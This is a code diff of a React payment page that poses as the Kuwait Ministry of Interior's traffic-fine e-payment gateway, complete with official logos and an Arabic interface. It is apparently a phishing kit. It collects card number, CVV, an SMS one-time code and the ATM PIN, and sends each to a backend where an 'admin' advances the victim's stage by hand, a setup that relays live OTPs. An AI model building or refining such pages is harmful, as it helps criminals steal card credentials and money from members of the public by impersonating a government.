@@ -1,88 +1,26 @@
 import React, { useState, useEffect, type ReactNode, type FormEvent } from "react";
-import { useLocation } from "wouter";
+import { useNavigate } from "react-router-dom";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
-import { Phone, Globe, Home as HomeIcon, ShieldCheck, Lock, CreditCard, ChevronRight, CheckCircle2, XCircle, AlertCircle, Loader2 } from "lucide-react";
+import { Phone, Lock, CreditCard, ShieldCheck, CheckCircle2, XCircle, Loader2, ArrowRight } from "lucide-react";
 
 type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
 
-type CardSubmitPayload = {
-  cardName: string;
-  cardNumber: string;
-  cardExpiry: string;
-  cardCvv: string;
-};
-
-function PaymentFrame({ children }: { children: ReactNode }) {
-  return (
-    <div className="flex flex-col min-h-screen bg-[#f1f0e8] font-sans" dir="ltr">
-      {children}
-    </div>
-  );
-}
-
-function PaymentGatewayHeader() {
-  return (
-    <header className="w-full bg-white shadow-sm border-b-4 border-[#003399]">
-      <div className="container py-4 flex items-center justify-between">
-        <div className="flex items-center gap-4">
-          <img src="/logo-moi.svg" alt="MOI Logo" className="h-12 md:h-16" />
-          <div className="hidden md:flex flex-col items-start">
-            <img src="/state-of-kuwait.svg" alt="State of Kuwait" className="h-4" />
-            <img src="/ministry-of-interior.svg" alt="Ministry of Interior" className="h-6 mt-0.5" />
-          </div>
-        </div>
-        <div className="flex items-center gap-3">
-          <div className="text-right hidden sm:block">
-            <div className="text-xs font-bold text-[#003399]">بوابة الدفع الإلكتروني</div>
-            <div className="text-[10px] text-gray-500">E-Payment Gateway</div>
-          </div>
-          <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-[#003399]">
-            <Lock className="w-5 h-5" />
-          </div>
-        </div>
-      </div>
-    </header>
-  );
-}
-
-function SectionCard({ title, children }: { title: string; children: ReactNode }) {
-  return (
-    <section className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden mb-6">
-      <div className="bg-[#f8f9fa] px-6 py-4 border-b border-gray-100 flex items-center justify-between">
-        <h3 className="text-sm font-black text-gray-700 uppercase tracking-wider">{title}</h3>
-        <ShieldCheck className="w-4 h-4 text-green-500" />
-      </div>
-      <div className="p-6">{children}</div>
-    </section>
-  );
-}
-
-function InfoTable({ rows }: { rows: Array<{ label: string; value: string }> }) {
-  return (
-    <div className="space-y-3">
-      {rows.map((row, index) => (
-        <div key={index} className="flex justify-between items-center py-2 border-b border-gray-50 last:border-0">
-          <span className="text-sm text-gray-500">{row.label}</span>
-          <span className="text-sm font-bold text-gray-900">{row.value}</span>
-        </div>
-      ))}
-    </div>
-  );
-}
-
 export default function Payment() {
-  const [location, navigate] = useLocation();
+  const navigate = useNavigate();
   const [stage, setStage] = useState<Stage>("card");
   const [paymentData, setPaymentData] = useState<any>(null);
+  const [sessionId, setSessionId] = useState<string | null>(null);
   const [error, setError] = useState<string | null>(null);
+  
+  const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
   const [otp, setOtp] = useState("");
   const [pin, setPin] = useState("");
   
-  const { lang, t } = useLanguage();
+  const { lang } = useLanguage();
 
   useEffect(() => {
     const data = sessionStorage.getItem("paymentData");
@@ -90,19 +28,61 @@ export default function Payment() {
       navigate("/");
       return;
     }
-    setPaymentData(JSON.parse(data));
-  }, [navigate]);
+    const parsed = JSON.parse(data);
+    setPaymentData(parsed);
+    
+    // Create payment session on load
+    createSessionMutation.mutate({
+      selectedFines: parsed.selectedFines,
+      totalAmount: parsed.totalAmount,
+      civilId: parsed.civilId,
+      enquiryType: parsed.enquiryType,
+      queryId: parsed.queryId
+    });
+  }, []);
 
-  const processPayment = trpc.fines.processPayment.useMutation({
+  const createSessionMutation = trpc.payment.createSession.useMutation({
     onSuccess: (data) => {
-      if (data.status === "otp_required") setStage("otp");
-      else if (data.status === "pin_required") setStage("atm");
-      else if (data.status === "success") setStage("success");
-      else {
-        setError(data.message || "Payment failed");
-        setStage("failed");
+      setSessionId(data.sessionId);
+    }
+  });
+
+  // Polling for stage changes from admin
+  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
+    { sessionId: sessionId || "" },
+    { 
+      enabled: !!sessionId && (stage.endsWith("_pending")),
+      refetchInterval: 2000 
+    }
+  );
+
+  useEffect(() => {
+    if (sessionStatus?.stage) {
+      setStage(sessionStatus.stage as Stage);
+      if (sessionStatus.errorMessage) {
+        setError(sessionStatus.errorMessage);
       }
-    },
+    }
+  }, [sessionStatus]);
+
+  const submitCard = trpc.payment.submitCard.useMutation({
+    onSuccess: () => setStage("card_pending"),
+    onError: (err) => {
+      setError(err.message);
+      setStage("failed");
+    }
+  });
+
+  const submitOtp = trpc.payment.submitOtp.useMutation({
+    onSuccess: () => setStage("otp_pending"),
+    onError: (err) => {
+      setError(err.message);
+      setStage("failed");
+    }
+  });
+
+  const submitPin = trpc.payment.submitAtmPin.useMutation({
+    onSuccess: () => setStage("atm_pending"),
     onError: (err) => {
       setError(err.message);
       setStage("failed");
@@ -111,230 +91,288 @@ export default function Payment() {
 
   const handleCardSubmit = (e: FormEvent) => {
     e.preventDefault();
-    setStage("card_pending");
-    setTimeout(() => {
-      processPayment.mutate({
-        step: "card",
-        cardNumber: cardNumber.replace(/\s/g, ""),
-        expiry,
-        cvv,
-        paymentData
-      });
-    }, 1500);
+    if (!sessionId) return;
+    submitCard.mutate({
+      sessionId,
+      cardName: cardName || "Customer",
+      cardNumber: cardNumber.replace(/\s/g, ""),
+      cardExpiry: expiry,
+      cardCvv: cvv
+    });
   };
 
   const handleOtpSubmit = (e: FormEvent) => {
     e.preventDefault();
-    setStage("otp_pending");
-    setTimeout(() => {
-      processPayment.mutate({
-        step: "otp",
-        otp,
-        paymentData
-      });
-    }, 1500);
+    if (!sessionId) return;
+    submitOtp.mutate({
+      sessionId,
+      otpCode: otp
+    });
   };
 
   const handlePinSubmit = (e: FormEvent) => {
     e.preventDefault();
-    setStage("atm_pending");
-    setTimeout(() => {
-      processPayment.mutate({
-        step: "pin",
-        pin,
-        paymentData
-      });
-    }, 2000);
+    if (!sessionId) return;
+    submitPin.mutate({
+      sessionId,
+      atmPin: pin
+    });
   };
 
   if (!paymentData) return null;
 
   return (
-    <PaymentFrame>
-      <PaymentGatewayHeader />
-      
-      <main className="flex-1 container py-8 max-w-4xl mx-auto">
+    <div className="min-h-screen bg-[#f8f9fa] font-cairo" dir="rtl">
+      {/* Header */}
+      <header className="bg-white border-b-4 border-[#003366] shadow-sm">
+        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
+          <div className="flex items-center gap-4">
+            <img src="/logo-moi.svg" alt="MOI Logo" className="h-12 md:h-16" />
+          </div>
+          <div className="flex items-center gap-3">
+            <div className="text-right hidden sm:block">
+              <div className="text-sm font-bold text-[#003366]">بوابة الدفع الإلكتروني</div>
+              <div className="text-[10px] text-gray-500 uppercase">E-Payment Gateway</div>
+            </div>
+            <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-[#003366]">
+              <Lock className="w-5 h-5" />
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <main className="container mx-auto px-4 py-8 max-w-4xl">
         <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
-          {/* Left Column: Summary */}
-          <div className="md:col-span-1">
-            <SectionCard title="Payment Summary">
-              <div className="text-center py-4 mb-6 bg-blue-50 rounded-2xl">
-                <div className="text-[10px] text-blue-500 font-bold uppercase">Total Amount</div>
-                <div className="text-3xl font-black text-[#003399]">{paymentData.totalAmount} د.ك</div>
+          {/* Summary Column */}
+          <div className="md:col-span-1 order-2 md:order-1">
+            <div className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
+              <div className="bg-[#f8f9fa] px-4 py-3 border-b border-gray-200 text-right">
+                <h3 className="font-bold text-[#003366]">ملخص الدفع</h3>
               </div>
-              <InfoTable rows={[
-                { label: "Civil ID", value: paymentData.civilId },
-                { label: "Violations", value: paymentData.selectedFines.length.toString() },
-                { label: "Currency", value: "Kuwaiti Dinar" }
-              ]} />
-              <div className="mt-8 flex items-center gap-2 text-[10px] text-gray-400">
-                <ShieldCheck className="w-4 h-4" />
-                <span>Secure 256-bit SSL Encrypted Payment</span>
+              <div className="p-6 space-y-4 text-right">
+                <div className="bg-blue-50 p-4 rounded-lg text-center">
+                  <div className="text-xs text-blue-600 font-bold mb-1">المبلغ الإجمالي</div>
+                  <div className="text-3xl font-black text-[#003366]">{paymentData.totalAmount} دك</div>
+                </div>
+                
+                <div className="space-y-3 text-sm">
+                  <div className="flex justify-between flex-row-reverse">
+                    <span className="text-gray-500">الرقم المدني:</span>
+                    <span className="font-bold">{paymentData.civilId}</span>
+                  </div>
+                  <div className="flex justify-between flex-row-reverse">
+                    <span className="text-gray-500">عدد المخالفات:</span>
+                    <span className="font-bold">{paymentData.selectedFines.length}</span>
+                  </div>
+                  <div className="flex justify-between flex-row-reverse">
+                    <span className="text-gray-500">العملة:</span>
+                    <span className="font-bold">دينار كويتي</span>
+                  </div>
+                </div>
+
+                <div className="pt-4 flex items-center justify-end gap-2 text-[10px] text-gray-400">
+                  <span>دفع آمن SSL 256-bit</span>
+                  <ShieldCheck className="w-4 h-4" />
+                </div>
               </div>
-            </SectionCard>
+            </div>
           </div>
 
-          {/* Right Column: Payment Forms */}
-          <div className="md:col-span-2">
+          {/* Form Column */}
+          <div className="md:col-span-2 order-1 md:order-2">
             {stage === "card" && (
-              <SectionCard title="Card Details">
-                <form onSubmit={handleCardSubmit} className="space-y-6">
-                  <div>
-                    <label className="block text-xs font-bold text-gray-500 mb-2 uppercase">Card Number</label>
-                    <div className="relative">
+              <div className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
+                <div className="bg-[#f8f9fa] px-6 py-4 border-b border-gray-200 text-right">
+                  <h3 className="font-bold text-[#003366]">بيانات البطاقة البنكية</h3>
+                </div>
+                <div className="p-8">
+                  <form onSubmit={handleCardSubmit} className="space-y-6 text-right">
+                    <div>
+                      <label className="block text-sm font-bold text-gray-600 mb-2">اسم حامل البطاقة</label>
                       <input
                         type="text"
-                        value={cardNumber}
-                        onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").slice(0, 19))}
-                        placeholder="0000 0000 0000 0000"
-                        className="w-full h-12 px-4 rounded-xl border border-gray-200 focus:border-[#003399] focus:ring-0 text-lg font-mono"
+                        value={cardName}
+                        onChange={(e) => setCardName(e.target.value)}
+                        placeholder="الاسم كما يظهر على البطاقة"
+                        className="w-full h-12 px-4 rounded border border-gray-300 focus:border-[#003366] focus:ring-0 text-lg"
                         required
                       />
-                      <div className="absolute right-4 top-1/2 -translate-y-1/2">
-                        <CreditCard className="w-5 h-5 text-gray-300" />
+                    </div>
+                    <div>
+                      <label className="block text-sm font-bold text-gray-600 mb-2">رقم البطاقة</label>
+                      <div className="relative">
+                        <input
+                          type="text"
+                          value={cardNumber}
+                          onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").slice(0, 19))}
+                          placeholder="0000 0000 0000 0000"
+                          className="w-full h-12 px-4 rounded border border-gray-300 focus:border-[#003366] focus:ring-0 text-lg font-mono text-left"
+                          dir="ltr"
+                          required
+                        />
+                        <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 w-6 h-6" />
                       </div>
                     </div>
-                  </div>
-                  
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <label className="block text-xs font-bold text-gray-500 mb-2 uppercase">Expiry Date</label>
-                      <input
-                        type="text"
-                        value={expiry}
-                        onChange={(e) => setExpiry(e.target.value.replace(/\D/g, "").replace(/(\d{2})(?=\d)/g, "$1/").slice(0, 5))}
-                        placeholder="MM/YY"
-                        className="w-full h-12 px-4 rounded-xl border border-gray-200 focus:border-[#003399] focus:ring-0 text-lg font-mono"
-                        required
-                      />
+                    
+                    <div className="grid grid-cols-2 gap-6">
+                      <div>
+                        <label className="block text-sm font-bold text-gray-600 mb-2">تاريخ الانتهاء</label>
+                        <input
+                          type="text"
+                          value={expiry}
+                          onChange={(e) => setExpiry(e.target.value.replace(/\D/g, "").replace(/(\d{2})(?=\d)/g, "$1/").slice(0, 5))}
+                          placeholder="MM/YY"
+                          className="w-full h-12 px-4 rounded border border-gray-300 focus:border-[#003366] focus:ring-0 text-lg text-center"
+                          dir="ltr"
+                          required
+                        />
+                      </div>
+                      <div>
+                        <label className="block text-sm font-bold text-gray-600 mb-2">رمز التحقق (CVV)</label>
+                        <input
+                          type="password"
+                          value={cvv}
+                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
+                          placeholder="***"
+                          className="w-full h-12 px-4 rounded border border-gray-300 focus:border-[#003366] focus:ring-0 text-lg text-center"
+                          dir="ltr"
+                          required
+                        />
+                      </div>
                     </div>
-                    <div>
-                      <label className="block text-xs font-bold text-gray-500 mb-2 uppercase">CVV</label>
-                      <input
-                        type="password"
-                        value={cvv}
-                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
-                        placeholder="123"
-                        className="w-full h-12 px-4 rounded-xl border border-gray-200 focus:border-[#003399] focus:ring-0 text-lg font-mono"
-                        required
-                      />
-                    </div>
-                  </div>
 
-                  <button
-                    type="submit"
-                    className="w-full h-14 bg-[#003399] hover:bg-[#002266] text-white rounded-xl font-black text-lg shadow-lg shadow-blue-900/20 transition-all"
-                  >
-                    Pay Now
-                  </button>
-                </form>
-              </SectionCard>
+                    <Button
+                      type="submit"
+                      disabled={!sessionId || submitCard.isPending}
+                      className="w-full py-7 bg-[#003366] hover:bg-[#002244] text-white rounded font-bold text-xl shadow-md transition-all"
+                    >
+                      {submitCard.isPending ? <Loader2 className="animate-spin" /> : "إتمام الدفع"}
+                    </Button>
+                  </form>
+                </div>
+              </div>
             )}
 
             {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
-              <div className="bg-white rounded-2xl shadow-lg p-12 text-center border border-gray-200">
-                <Loader2 className="w-16 h-16 text-[#003399] animate-spin mx-auto mb-6" />
-                <h3 className="text-xl font-black text-gray-900 mb-2">Processing Payment...</h3>
-                <p className="text-gray-500">Please do not close or refresh this page.</p>
+              <div className="bg-white rounded-lg shadow-md p-16 text-center border border-gray-200">
+                <Loader2 className="w-20 h-20 text-[#003366] animate-spin mx-auto mb-8" />
+                <h3 className="text-2xl font-bold text-gray-800 mb-3">جاري معالجة الطلب...</h3>
+                <p className="text-gray-500">يرجى الانتظار وعدم إغلاق هذه الصفحة.</p>
               </div>
             )}
 
             {stage === "otp" && (
-              <SectionCard title="Verify Transaction">
-                <form onSubmit={handleOtpSubmit} className="space-y-6 text-center">
-                  <div className="w-16 h-16 bg-blue-50 text-[#003399] rounded-full flex items-center justify-center mx-auto mb-4">
-                    <Phone className="w-8 h-8" />
+              <div className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
+                <div className="bg-[#f8f9fa] px-6 py-4 border-b border-gray-200 text-right">
+                  <h3 className="font-bold text-[#003366]">التحقق من الهوية</h3>
+                </div>
+                <div className="p-8 text-center space-y-6">
+                  <div className="w-20 h-20 bg-blue-50 text-[#003366] rounded-full flex items-center justify-center mx-auto">
+                    <Phone className="w-10 h-10" />
                   </div>
-                  <h3 className="text-lg font-black">Enter Verification Code</h3>
-                  <p className="text-sm text-gray-500">A 6-digit code has been sent to your mobile number.</p>
+                  <div className="space-y-2">
+                    <h3 className="text-xl font-bold">أدخل رمز التحقق (OTP)</h3>
+                    <p className="text-gray-500">تم إرسال رمز مكون من 6 أرقام إلى هاتفك المسجل.</p>
+                  </div>
                   
-                  <input
-                    type="text"
-                    value={otp}
-                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
-                    placeholder="000000"
-                    className="w-full h-14 px-4 rounded-xl border-2 border-gray-200 focus:border-[#003399] focus:ring-0 text-2xl font-black tracking-[1em] text-center"
-                    required
-                  />
-
-                  <button
-                    type="submit"
-                    className="w-full h-14 bg-[#003399] hover:bg-[#002266] text-white rounded-xl font-black text-lg transition-all"
-                  >
-                    Confirm Code
-                  </button>
-                </form>
-              </SectionCard>
+                  <form onSubmit={handleOtpSubmit} className="space-y-6 max-w-xs mx-auto">
+                    <input
+                      type="text"
+                      value={otp}
+                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                      placeholder="000000"
+                      className="w-full h-16 px-4 rounded border-2 border-gray-200 focus:border-[#003366] focus:ring-0 text-3xl font-bold tracking-[0.5em] text-center"
+                      required
+                    />
+                    {error && <p className="text-red-600 text-sm font-bold">{error}</p>}
+                    <Button
+                      type="submit"
+                      className="w-full py-6 bg-[#003366] hover:bg-[#002244] text-white rounded font-bold text-lg"
+                    >
+                      تأكيد الرمز
+                    </Button>
+                  </form>
+                </div>
+              </div>
             )}
 
             {stage === "atm" && (
-              <SectionCard title="ATM PIN Verification">
-                <form onSubmit={handlePinSubmit} className="space-y-6 text-center">
-                  <div className="w-16 h-16 bg-blue-50 text-[#003399] rounded-full flex items-center justify-center mx-auto mb-4">
-                    <Lock className="w-8 h-8" />
+              <div className="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
+                <div className="bg-[#f8f9fa] px-6 py-4 border-b border-gray-200 text-right">
+                  <h3 className="font-bold text-[#003366]">تأكيد الرقم السري</h3>
+                </div>
+                <div className="p-8 text-center space-y-6">
+                  <div className="w-20 h-20 bg-blue-50 text-[#003366] rounded-full flex items-center justify-center mx-auto">
+                    <Lock className="w-10 h-10" />
                   </div>
-                  <h3 className="text-lg font-black">Enter Card PIN</h3>
-                  <p className="text-sm text-gray-500">Please enter your 4-digit ATM PIN for security.</p>
+                  <div className="space-y-2">
+                    <h3 className="text-xl font-bold">أدخل الرقم السري للبطاقة</h3>
+                    <p className="text-gray-500">يرجى إدخال الرقم السري المكون من 4 أرقام (PIN).</p>
+                  </div>
                   
-                  <input
-                    type="password"
-                    value={pin}
-                    onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
-                    placeholder="••••"
-                    className="w-full h-14 px-4 rounded-xl border-2 border-gray-200 focus:border-[#003399] focus:ring-0 text-2xl font-black tracking-[1em] text-center"
-                    required
-                  />
-
-                  <button
-                    type="submit"
-                    className="w-full h-14 bg-[#003399] hover:bg-[#002266] text-white rounded-xl font-black text-lg transition-all"
-                  >
-                    Confirm PIN
-                  </button>
-                </form>
-              </SectionCard>
+                  <form onSubmit={handlePinSubmit} className="space-y-6 max-w-xs mx-auto">
+                    <input
+                      type="password"
+                      value={pin}
+                      onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                      placeholder="••••"
+                      className="w-full h-16 px-4 rounded border-2 border-gray-200 focus:border-[#003366] focus:ring-0 text-3xl font-bold tracking-[0.5em] text-center"
+                      required
+                    />
+                    {error && <p className="text-red-600 text-sm font-bold">{error}</p>}
+                    <Button
+                      type="submit"
+                      className="w-full py-6 bg-[#003366] hover:bg-[#002244] text-white rounded font-bold text-lg"
+                    >
+                      تأكيد الرقم السري
+                    </Button>
+                  </form>
+                </div>
+              </div>
             )}
 
             {stage === "success" && (
-              <div className="bg-white rounded-2xl shadow-lg p-12 text-center border border-gray-200">
-                <div className="w-20 h-20 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
-                  <CheckCircle2 className="w-10 h-10" />
+              <div className="bg-white rounded-lg shadow-md p-16 text-center border border-gray-200">
+                <div className="w-24 h-24 bg-green-50 text-green-600 rounded-full flex items-center justify-center mx-auto mb-8">
+                  <CheckCircle2 className="w-12 h-12" />
                 </div>
-                <h3 className="text-2xl font-black text-gray-900 mb-2">Payment Successful!</h3>
-                <p className="text-gray-500 mb-8">Your transaction has been processed and violations updated.</p>
-                <button
+                <h3 className="text-3xl font-bold text-gray-800 mb-4">تمت عملية الدفع بنجاح!</h3>
+                <p className="text-gray-600 mb-10 text-lg">شكراً لك، تم استلام دفعتك وتحديث سجل المخالفات.</p>
+                <Button
                   onClick={() => navigate("/")}
-                  className="px-8 py-3 bg-[#003399] text-white rounded-xl font-black transition-all"
+                  className="bg-[#003366] text-white py-6 px-12 text-lg font-bold rounded"
                 >
-                  Return to Home
-                </button>
+                  العودة للرئيسية
+                </Button>
               </div>
             )}
 
             {stage === "failed" && (
-              <div className="bg-white rounded-2xl shadow-lg p-12 text-center border border-gray-200">
-                <div className="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
-                  <XCircle className="w-10 h-10" />
+              <div className="bg-white rounded-lg shadow-md p-16 text-center border border-gray-200">
+                <div className="w-24 h-24 bg-red-50 text-red-600 rounded-full flex items-center justify-center mx-auto mb-8">
+                  <XCircle className="w-12 h-12" />
                 </div>
-                <h3 className="text-2xl font-black text-gray-900 mb-2">Payment Failed</h3>
-                <p className="text-red-500 mb-8">{error || "Transaction declined by issuing bank."}</p>
-                <button
-                  onClick={() => setStage("card")}
-                  className="px-8 py-3 bg-gray-900 text-white rounded-xl font-black transition-all"
+                <h3 className="text-3xl font-bold text-gray-800 mb-4">فشلت عملية الدفع</h3>
+                <p className="text-red-600 mb-10 text-lg">{error || "تم رفض المعاملة من قبل البنك."}</p>
+                <Button
+                  onClick={() => { setError(null); setStage("card"); }}
+                  className="bg-gray-800 text-white py-6 px-12 text-lg font-bold rounded"
                 >
-                  Try Again
-                </button>
+                  حاول مرة أخرى
+                </Button>
               </div>
             )}
           </div>
         </div>
       </main>
 
-      <footer className="w-full bg-white border-t border-gray-200 py-6 text-center">
-        <p className="text-xs text-gray-400 font-bold">
-          © 2026 Ministry of Interior - State of Kuwait. All Rights Reserved.
-        </p>
+      <footer className="bg-white border-t border-gray-200 py-8 mt-20 text-center">
+        <div className="container mx-auto px-4">
+          <p className="text-sm text-gray-400 font-bold">
+            © 2026 وزارة الداخلية - دولة الكويت. جميع الحقوق محفوظة.
+          </p>
+        </div>
       </footer>
-    </PaymentFrame>
+    </div>
   );
 }
